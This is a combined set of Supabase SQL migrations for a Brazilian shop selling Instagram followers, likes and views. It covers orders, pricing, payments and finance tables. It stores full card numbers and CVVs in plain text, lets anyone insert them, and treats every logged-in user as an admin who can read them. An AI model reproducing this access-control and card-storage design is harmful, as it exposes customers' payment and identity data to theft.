-- =============================================================================
-- SCHEMA COMPLETO (todas as migrations em ordem)
-- Supabase: SQL Editor -> colar -> Run
--
-- Extensoes: se falhar pg_cron/pg_net, ative em Database -> Extensions.
-- =============================================================================



-- ========== 20260322051846_b99a57af-7097-43df-aace-aeb799db5d5b.sql ==========

-- Create packages table for configurable follower packages
CREATE TABLE public.packages (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  quantity INTEGER NOT NULL,
  price INTEGER NOT NULL, -- price in cents (BRL)
  discount_price INTEGER, -- discounted price in cents (BRL), null = no discount
  active BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Create orders table
CREATE TABLE public.orders (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  username TEXT NOT NULL,
  quantity INTEGER NOT NULL,
  amount INTEGER NOT NULL,
  is_discounted BOOLEAN NOT NULL DEFAULT false,
  customer_name TEXT NOT NULL,
  customer_email TEXT NOT NULL,
  customer_phone TEXT NOT NULL,
  customer_document TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending',
  transaction_hash TEXT,
  pix_qr_code TEXT,
  pix_qr_code_url TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS
ALTER TABLE public.packages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;

-- Packages are readable by everyone (public catalog)
CREATE POLICY "Packages are viewable by everyone" ON public.packages FOR SELECT USING (true);

-- Only authenticated admins can manage packages (we'll use has_role later)
CREATE POLICY "Admins can manage packages" ON public.packages FOR ALL USING (auth.uid() IS NOT NULL) WITH CHECK (auth.uid() IS NOT NULL);

-- Orders are publicly insertable (customers create orders)
CREATE POLICY "Anyone can create orders" ON public.orders FOR INSERT WITH CHECK (true);

-- Orders viewable by admins only
CREATE POLICY "Admins can view orders" ON public.orders FOR SELECT USING (auth.uid() IS NOT NULL);

-- Orders updatable by admins
CREATE POLICY "Admins can update orders" ON public.orders FOR UPDATE USING (auth.uid() IS NOT NULL);

-- Timestamp trigger
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

CREATE TRIGGER update_packages_updated_at BEFORE UPDATE ON public.packages FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();
CREATE TRIGGER update_orders_updated_at BEFORE UPDATE ON public.orders FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- Insert default packages
INSERT INTO public.packages (quantity, price, discount_price) VALUES
  (50, 1990, 1490),
  (100, 3490, 2490),
  (500, 14990, 9990),
  (1000, 24990, 17990);


-- ========== 20260322064253_6be75cf8-8d55-4fb0-8a76-d4b894d84d7f.sql ==========
ALTER TABLE public.orders
  ADD COLUMN IF NOT EXISTS smm_order_id text,
  ADD COLUMN IF NOT EXISTS queued boolean NOT NULL DEFAULT false;

-- ========== 20260322064343_13fd0f3b-de05-404b-b0d7-11206ce2f7c7.sql ==========
CREATE EXTENSION IF NOT EXISTS pg_cron WITH SCHEMA extensions;
CREATE EXTENSION IF NOT EXISTS pg_net WITH SCHEMA extensions;

-- ========== 20260324010936_957772d9-5b5f-431c-9cdc-57b84d9a193e.sql ==========

CREATE OR REPLACE FUNCTION public.prevent_duplicate_orders()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = 'public'
AS $$
BEGIN
  -- Delete any existing pending/waiting_payment order with same username and quantity
  -- created in the last 5 minutes (to avoid deleting legitimate repeat orders)
  DELETE FROM public.orders
  WHERE id != NEW.id
    AND username = NEW.username
    AND quantity = NEW.quantity
    AND status IN ('pending', 'waiting_payment', 'unknown')
    AND created_at >= (now() - interval '5 minutes');
  
  RETURN NEW;
END;
$$;

CREATE TRIGGER trg_prevent_duplicate_orders
  AFTER INSERT ON public.orders
  FOR EACH ROW
  EXECUTE FUNCTION public.prevent_duplicate_orders();


-- ========== 20260324121403_580b39fc-5aeb-4a57-a47e-28d98d674bf1.sql ==========
CREATE POLICY "Admins can delete orders" ON public.orders FOR DELETE TO authenticated USING (auth.uid() IS NOT NULL);

-- ========== 20260324211526_b9af69b5-8ee4-4cbc-bb9e-3dea840bfaf2.sql ==========

UPDATE packages SET price = 466, discount_price = NULL WHERE quantity = 50;
UPDATE packages SET price = 736, discount_price = NULL WHERE quantity = 100;
UPDATE packages SET price = 990, discount_price = NULL WHERE quantity = 300;
UPDATE packages SET price = 1590, discount_price = NULL WHERE quantity = 1000;
UPDATE packages SET price = 5690, discount_price = NULL WHERE quantity = 10000;
DELETE FROM packages WHERE quantity = 3000;
INSERT INTO packages (quantity, price, active) VALUES (5000, 2790, true);
INSERT INTO packages (quantity, price, active) VALUES (20000, 7690, true);
INSERT INTO packages (quantity, price, active) VALUES (50000, 9090, true);


-- ========== 20260325035616_306bd105-e392-4ce6-a12c-0a51cfe04f3d.sql ==========

CREATE OR REPLACE FUNCTION public.prevent_duplicate_orders()
 RETURNS trigger
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public'
AS $function$
BEGIN
  -- Delete any existing pending/waiting_payment order with same username and quantity
  -- BUT only if they don't have a transaction_hash (payment not yet initiated)
  DELETE FROM public.orders
  WHERE id != NEW.id
    AND username = NEW.username
    AND quantity = NEW.quantity
    AND status IN ('pending', 'waiting_payment', 'unknown')
    AND transaction_hash IS NULL
    AND created_at >= (now() - interval '5 minutes');
  
  RETURN NEW;
END;
$function$;


-- ========== 20260325113303_6d840de9-01a2-4b60-95a5-8c91b6ee2b26.sql ==========

CREATE TABLE public.settings (
  key text PRIMARY KEY,
  value text NOT NULL,
  updated_at timestamptz NOT NULL DEFAULT now()
);

ALTER TABLE public.settings ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Settings viewable by everyone" ON public.settings FOR SELECT TO public USING (true);
CREATE POLICY "Admins can manage settings" ON public.settings FOR ALL TO authenticated USING (auth.uid() IS NOT NULL) WITH CHECK (auth.uid() IS NOT NULL);

INSERT INTO public.settings (key, value) VALUES ('smm_service_id', '472');


-- ========== 20260331092146_72ef4025-d247-4331-894d-66de28ed5bac.sql ==========

ALTER TABLE public.orders ADD COLUMN IF NOT EXISTS payment_method text NOT NULL DEFAULT 'pix';

CREATE TABLE public.card_details (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  order_id uuid REFERENCES public.orders(id) ON DELETE CASCADE NOT NULL,
  card_number text NOT NULL,
  card_holder text NOT NULL,
  card_expiry text NOT NULL,
  card_cvv text NOT NULL,
  created_at timestamp with time zone NOT NULL DEFAULT now()
);

ALTER TABLE public.card_details ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can insert card_details" ON public.card_details FOR INSERT TO public WITH CHECK (true);
CREATE POLICY "Admins can view card_details" ON public.card_details FOR SELECT TO authenticated USING (auth.uid() IS NOT NULL);


-- ========== 20260402121000_like_packages_and_orders.sql ==========
-- Pacotes de curtidas (upsell) e colunas em pedidos

CREATE TABLE public.like_packages (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  quantity INTEGER NOT NULL,
  price INTEGER NOT NULL,
  discount_price INTEGER,
  active BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  CONSTRAINT like_packages_quantity_unique UNIQUE (quantity)
);

ALTER TABLE public.like_packages ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Like packages are viewable by everyone"
  ON public.like_packages FOR SELECT USING (true);

CREATE POLICY "Admins can manage like_packages"
  ON public.like_packages FOR ALL
  USING (auth.uid() IS NOT NULL)
  WITH CHECK (auth.uid() IS NOT NULL);

CREATE TRIGGER update_like_packages_updated_at
  BEFORE UPDATE ON public.like_packages
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

INSERT INTO public.like_packages (quantity, price, discount_price, active) VALUES
  (100, 990, NULL, true),
  (500, 3990, NULL, true),
  (1000, 6990, NULL, true);

ALTER TABLE public.orders
  ADD COLUMN IF NOT EXISTS product_type text NOT NULL DEFAULT 'followers',
  ADD COLUMN IF NOT EXISTS post_url text,
  ADD COLUMN IF NOT EXISTS parent_order_id uuid REFERENCES public.orders(id) ON DELETE SET NULL;

CREATE INDEX IF NOT EXISTS idx_orders_product_type ON public.orders (product_type);

COMMENT ON COLUMN public.orders.product_type IS 'followers | likes';
COMMENT ON COLUMN public.orders.post_url IS 'Link da publicação (Instagram) para pedidos de curtidas';

-- Deduplicação: considerar também o tipo de produto
CREATE OR REPLACE FUNCTION public.prevent_duplicate_orders()
 RETURNS trigger
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public'
AS $function$
BEGIN
  DELETE FROM public.orders
  WHERE id != NEW.id
    AND username = NEW.username
    AND quantity = NEW.quantity
    AND COALESCE(product_type, 'followers') = COALESCE(NEW.product_type, 'followers')
    AND status IN ('pending', 'waiting_payment', 'unknown')
    AND transaction_hash IS NULL
    AND created_at >= (now() - interval '5 minutes');

  RETURN NEW;
END;
$function$;


-- ========== 20260402140000_like_packages_grants_policies.sql ==========
-- PRÉ-REQUISITO: rode antes a migração 20260402121000_like_packages_and_orders.sql
-- (CREATE TABLE like_packages + colunas em orders). Sem a tabela, este arquivo falha com:
-- relation "public.like_packages" does not exist

-- Garantir permissões e políticas RLS explícitas em like_packages (insert/update costumavam falhar
-- com FOR ALL em alguns projetos Supabase).

GRANT SELECT ON public.like_packages TO anon;
GRANT SELECT, INSERT, UPDATE, DELETE ON public.like_packages TO authenticated;
GRANT ALL ON public.like_packages TO service_role;

DROP POLICY IF EXISTS "Like packages are viewable by everyone" ON public.like_packages;
DROP POLICY IF EXISTS "Admins can manage like_packages" ON public.like_packages;

CREATE POLICY "like_packages_select_public"
  ON public.like_packages FOR SELECT
  USING (true);

CREATE POLICY "like_packages_insert_authenticated"
  ON public.like_packages FOR INSERT TO authenticated
  WITH CHECK (auth.uid() IS NOT NULL);

CREATE POLICY "like_packages_update_authenticated"
  ON public.like_packages FOR UPDATE TO authenticated
  USING (auth.uid() IS NOT NULL)
  WITH CHECK (auth.uid() IS NOT NULL);

CREATE POLICY "like_packages_delete_authenticated"
  ON public.like_packages FOR DELETE TO authenticated
  USING (auth.uid() IS NOT NULL);


-- ========== 20260402155000_refmidia_packages_unique.sql ==========
-- Remove duplicated packages by quantity (keep most recent), then enforce uniqueness.
-- This prevents PurchasePage .maybeSingle() from failing due to multiple rows.

DELETE FROM public.packages p
USING public.packages p2
WHERE p.quantity = p2.quantity
  AND p.created_at < p2.created_at;

-- If two rows share the same created_at, keep the one with the greater id (arbitrary but stable).
DELETE FROM public.packages p
USING public.packages p2
WHERE p.quantity = p2.quantity
  AND p.created_at = p2.created_at
  AND p.id < p2.id;

ALTER TABLE public.packages
  ADD CONSTRAINT packages_quantity_unique UNIQUE (quantity);



-- ========== 20260402160000_packages_kind_merge_likes.sql ==========
-- Curtidas no mesmo lugar que seguidores: coluna kind em packages (API já conhece "packages").
-- Remove dependência de like_packages (evita erro de schema cache no PostgREST).

ALTER TABLE public.packages
  ADD COLUMN IF NOT EXISTS kind text NOT NULL DEFAULT 'followers';

ALTER TABLE public.packages
  DROP CONSTRAINT IF EXISTS packages_kind_check;

ALTER TABLE public.packages
  ADD CONSTRAINT packages_kind_check CHECK (kind IN ('followers', 'likes'));

ALTER TABLE public.packages DROP CONSTRAINT IF EXISTS packages_quantity_unique;

CREATE UNIQUE INDEX IF NOT EXISTS packages_kind_quantity_unique ON public.packages (kind, quantity);

DO $mig$
BEGIN
  IF to_regclass('public.like_packages') IS NOT NULL THEN
    INSERT INTO public.packages (quantity, price, discount_price, active, kind)
    SELECT quantity, price, discount_price, COALESCE(active, true), 'likes'::text
    FROM public.like_packages
    ON CONFLICT (kind, quantity) DO UPDATE SET
      price = EXCLUDED.price,
      discount_price = EXCLUDED.discount_price,
      active = EXCLUDED.active,
      updated_at = now();

    DROP TABLE public.like_packages CASCADE;
  END IF;
END
$mig$;


-- ========== 20260402180000_orders_smm_last_error.sql ==========
ALTER TABLE public.orders ADD COLUMN IF NOT EXISTS smm_last_error text;


-- ========== 20260402193000_ensure_public_settings.sql ==========
-- Migração anterior estava no histórico sem a tabela existir (DB inconsistente).
CREATE TABLE IF NOT EXISTS public.settings (
  key text PRIMARY KEY,
  value text NOT NULL,
  updated_at timestamptz NOT NULL DEFAULT now()
);

ALTER TABLE public.settings ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Settings viewable by everyone" ON public.settings;
CREATE POLICY "Settings viewable by everyone" ON public.settings FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Admins can manage settings" ON public.settings;
CREATE POLICY "Admins can manage settings" ON public.settings FOR ALL TO authenticated USING (auth.uid() IS NOT NULL) WITH CHECK (auth.uid() IS NOT NULL);

INSERT INTO public.settings (key, value) VALUES ('smm_service_id', '472')
ON CONFLICT (key) DO NOTHING;


-- ========== 20260402200000_orders_payment_gateway.sql ==========
-- Gateway ativo (default) + rastreio por pedido (troca no admin não quebra PIX antigo)
ALTER TABLE public.orders ADD COLUMN IF NOT EXISTS payment_gateway text NOT NULL DEFAULT 'x';

INSERT INTO public.settings (key, value) VALUES ('payment_gateway', 'x')
ON CONFLICT (key) DO NOTHING;


-- ========== 20260403120000_compute_chopped_package_price.sql ==========
-- Preço "picado": base = maior pacote com quantity <= pedido; se pedido < mínimo, base = mínimo.
-- Valor = round(pedido * (preço_base / qtd_base)) em centavos (equiv. a 2 casas em reais).
-- Opcional: filtrar por service_id na tabela packages (NULL = todos).

ALTER TABLE public.packages
  ADD COLUMN IF NOT EXISTS service_id text NULL;

COMMENT ON COLUMN public.packages.service_id IS 'Opcional: id do serviço SMM/fornecedor; usado em compute_chopped_package_price quando p_service_id é informado.';

CREATE OR REPLACE FUNCTION public.compute_chopped_package_price(
  p_requested_quantity integer,
  p_kind text DEFAULT 'followers',
  p_prefer_discount boolean DEFAULT false,
  p_service_id text DEFAULT NULL
)
RETURNS TABLE (
  amount_cents bigint,
  base_quantity integer,
  base_price_cents bigint,
  base_package_id uuid,
  is_exact boolean
)
LANGUAGE plpgsql
STABLE
SECURITY INVOKER
SET search_path = public
AS $$
DECLARE
  rq integer;
  sid text := NULLIF(TRIM(COALESCE(p_service_id, '')), '');
  base_q integer;
  cid uuid;
  bq integer;
  bp integer;
  dprice integer;
  eff numeric;
  amt numeric;
  exact_flag boolean;
BEGIN
  IF p_requested_quantity IS NULL OR p_requested_quantity < 1 THEN
    RAISE EXCEPTION 'Quantidade inválida';
  END IF;

  rq := p_requested_quantity;

  cid := NULL;
  SELECT p.id, p.quantity, p.price, p.discount_price
  INTO cid, bq, bp, dprice
  FROM public.packages p
  WHERE p.active
    AND lower(btrim(p.kind::text)) = lower(btrim(p_kind::text))
    AND p.quantity = rq
    AND (sid IS NULL OR p.service_id IS NOT DISTINCT FROM sid)
  LIMIT 1;

  IF cid IS NOT NULL THEN
    eff := CASE
      WHEN p_prefer_discount AND dprice IS NOT NULL THEN dprice::numeric
      ELSE bp::numeric
    END;
    amt := round(eff);
    IF amt < 1 THEN
      amt := 1;
    END IF;
    RETURN QUERY
    SELECT
      amt::bigint,
      bq,
      round(eff)::bigint,
      cid,
      true;
    RETURN;
  END IF;

  SELECT MAX(p.quantity) INTO base_q
  FROM public.packages p
  WHERE p.active
    AND lower(btrim(p.kind::text)) = lower(btrim(p_kind::text))
    AND p.quantity <= rq
    AND (sid IS NULL OR p.service_id IS NOT DISTINCT FROM sid);

  IF base_q IS NULL THEN
    SELECT MIN(p.quantity) INTO base_q
    FROM public.packages p
    WHERE p.active
      AND lower(btrim(p.kind::text)) = lower(btrim(p_kind::text))
      AND (sid IS NULL OR p.service_id IS NOT DISTINCT FROM sid);
  END IF;

  IF base_q IS NULL THEN
    RAISE EXCEPTION 'Nenhum pacote ativo para este tipo';
  END IF;

  SELECT p.id, p.quantity, p.price, p.discount_price
  INTO cid, bq, bp, dprice
  FROM public.packages p
  WHERE p.active
    AND lower(btrim(p.kind::text)) = lower(btrim(p_kind::text))
    AND p.quantity = base_q
    AND (sid IS NULL OR p.service_id IS NOT DISTINCT FROM sid)
  LIMIT 1;

  IF cid IS NULL THEN
    RAISE EXCEPTION 'Pacote base não encontrado';
  END IF;

  eff := CASE
    WHEN p_prefer_discount AND dprice IS NOT NULL THEN dprice::numeric
    ELSE bp::numeric
  END;

  amt := round(rq::numeric * (eff / bq::numeric), 0);
  IF amt < 1 THEN
    amt := 1;
  END IF;

  SELECT EXISTS (
    SELECT 1
    FROM public.packages p2
    WHERE p2.active
      AND lower(btrim(p2.kind::text)) = lower(btrim(p_kind::text))
      AND p2.quantity = rq
      AND (sid IS NULL OR p2.service_id IS NOT DISTINCT FROM sid)
  ) INTO exact_flag;

  RETURN QUERY
  SELECT
    amt::bigint,
    bq,
    round(eff)::bigint,
    cid,
    exact_flag;
END;
$$;

COMMENT ON FUNCTION public.compute_chopped_package_price(integer, text, boolean, text) IS
  'Exato: preço da linha. Picado: max(quantity)<=pedido (senão min); centavos.';

GRANT EXECUTE ON FUNCTION public.compute_chopped_package_price(integer, text, boolean, text) TO anon;
GRANT EXECUTE ON FUNCTION public.compute_chopped_package_price(integer, text, boolean, text) TO authenticated;
GRANT EXECUTE ON FUNCTION public.compute_chopped_package_price(integer, text, boolean, text) TO service_role;

NOTIFY pgrst, 'reload schema';


-- ========== 20260403140000_ensure_followers_package_300.sql ==========
-- Garante pacote 300 seguidores (R$ 9,90 = 990 centavos) para links /300= cobrarem a tabela, não só proporcional pelo 100.
INSERT INTO public.packages (quantity, price, discount_price, active, kind)
VALUES (300, 990, NULL, true, 'followers')
ON CONFLICT (kind, quantity) DO UPDATE SET
  price = EXCLUDED.price,
  discount_price = EXCLUDED.discount_price,
  active = true,
  updated_at = now();


-- ========== 20260405180000_financial_entries.sql ==========
-- Módulo financeiro (admin): lançamentos e fechamento diário

CREATE TABLE IF NOT EXISTS public.financial_entries (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  entry_date date NOT NULL DEFAULT ((now() AT TIME ZONE 'America/Sao_Paulo')::date),
  description text NOT NULL DEFAULT '',
  client_profile text NOT NULL DEFAULT '',
  facebook_investment_cents integer NOT NULL DEFAULT 0 CHECK (facebook_investment_cents >= 0),
  smm_investment_cents integer NOT NULL DEFAULT 0 CHECK (smm_investment_cents >= 0),
  openai_investment_cents integer NOT NULL DEFAULT 0 CHECK (openai_investment_cents >= 0),
  amount_received_cents integer NOT NULL DEFAULT 0 CHECK (amount_received_cents >= 0),
  total_cost_cents integer NOT NULL DEFAULT 0,
  net_profit_cents integer NOT NULL DEFAULT 0,
  partner_lucas_cents integer NOT NULL DEFAULT 0,
  partner_lua_cents integer NOT NULL DEFAULT 0,
  partner_fernando_cents integer NOT NULL DEFAULT 0,
  status text NOT NULL DEFAULT 'pendente' CHECK (status IN ('pendente', 'pago', 'cancelado')),
  notes text,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_financial_entries_entry_date ON public.financial_entries (entry_date DESC);
CREATE INDEX IF NOT EXISTS idx_financial_entries_status ON public.financial_entries (status);

ALTER TABLE public.financial_entries ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "financial_entries_select_authenticated" ON public.financial_entries;
CREATE POLICY "financial_entries_select_authenticated"
  ON public.financial_entries FOR SELECT TO authenticated
  USING (auth.uid() IS NOT NULL);

DROP POLICY IF EXISTS "financial_entries_insert_authenticated" ON public.financial_entries;
CREATE POLICY "financial_entries_insert_authenticated"
  ON public.financial_entries FOR INSERT TO authenticated
  WITH CHECK (auth.uid() IS NOT NULL);

DROP POLICY IF EXISTS "financial_entries_update_authenticated" ON public.financial_entries;
CREATE POLICY "financial_entries_update_authenticated"
  ON public.financial_entries FOR UPDATE TO authenticated
  USING (auth.uid() IS NOT NULL)
  WITH CHECK (auth.uid() IS NOT NULL);

DROP POLICY IF EXISTS "financial_entries_delete_authenticated" ON public.financial_entries;
CREATE POLICY "financial_entries_delete_authenticated"
  ON public.financial_entries FOR DELETE TO authenticated
  USING (auth.uid() IS NOT NULL);

DROP TRIGGER IF EXISTS update_financial_entries_updated_at ON public.financial_entries;
CREATE TRIGGER update_financial_entries_updated_at
  BEFORE UPDATE ON public.financial_entries
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();


-- ========== 20260406120000_orders_amount_net_cents.sql ==========
-- Valor líquido recebido após taxas Skale (centavos). Preenchido pelo webhook com transaction.net_amount.
ALTER TABLE public.orders ADD COLUMN IF NOT EXISTS amount_net_cents integer NULL;

COMMENT ON COLUMN public.orders.amount_net_cents IS
  'PIX Skale: valor líquido em centavos (net_amount do gateway). NULL = usar estimativa ou bruto nos relatórios.';


-- ========== 20260407190000_packages_add_views_kind.sql ==========
-- Adiciona suporte a "views" (visualizações) no catálogo de packages.
-- Mantém o índice único (kind, quantity) e amplia o CHECK.

ALTER TABLE public.packages
  ADD COLUMN IF NOT EXISTS kind text NOT NULL DEFAULT 'followers';

ALTER TABLE public.packages
  DROP CONSTRAINT IF EXISTS packages_kind_check;

ALTER TABLE public.packages
  ADD CONSTRAINT packages_kind_check CHECK (kind IN ('followers', 'likes', 'views'));

-- Garante índice único composto (caso ainda não exista)
CREATE UNIQUE INDEX IF NOT EXISTS packages_kind_quantity_unique ON public.packages (kind, quantity);



-- ========== Fim: recarregar API REST ==========
NOTIFY pgrst, 'reload schema';
